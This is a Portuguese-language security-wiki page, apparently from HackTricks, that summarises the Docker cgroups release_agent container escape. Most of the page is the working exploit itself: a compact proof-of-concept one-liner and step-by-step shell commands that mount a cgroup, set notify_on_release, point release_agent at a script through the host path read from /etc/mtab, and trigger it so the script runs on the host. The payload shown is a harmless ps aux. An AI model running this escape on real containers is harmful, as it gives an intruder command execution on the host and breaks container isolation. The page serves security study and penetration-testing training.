# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Para mais detalhes, consulte o** [**post original do blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este é apenas um resumo:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
A prova de conceito (PoC) demonstra um método para explorar cgroups criando um arquivo `release_agent` e acionando sua invocação para executar comandos arbitrários no host do contêiner. Aqui está uma análise das etapas envolvidas:

1. **Preparar o Ambiente:**
- Um diretório `/tmp/cgrp` é criado para servir como um ponto de montagem para o cgroup.
- O controlador de cgroup RDMA é montado neste diretório. Em caso de ausência do controlador RDMA, sugere-se usar o controlador de cgroup `memory` como alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurar o Cgroup Filho:**
- Um cgroup filho chamado "x" é criado dentro do diretório cgroup montado.
- As notificações são ativadas para o cgroup "x" escrevendo 1 no seu arquivo notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurar o Agente de Liberação:**
- O caminho do contêiner no host é obtido a partir do arquivo /etc/mtab.
- O arquivo release_agent do cgroup é então configurado para executar um script chamado /cmd localizado no caminho do host adquirido.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Criar e Configurar o Script /cmd:**
- O script /cmd é criado dentro do contêiner e é configurado para executar ps aux, redirecionando a saída para um arquivo chamado /output no contêiner. O caminho completo de /output no host é especificado.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Acionar o Ataque:**
- Um processo é iniciado dentro do cgroup filho "x" e é imediatamente terminado.
- Isso aciona o `release_agent` (o script /cmd), que executa ps aux no host e grava a saída em /output dentro do contêiner.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
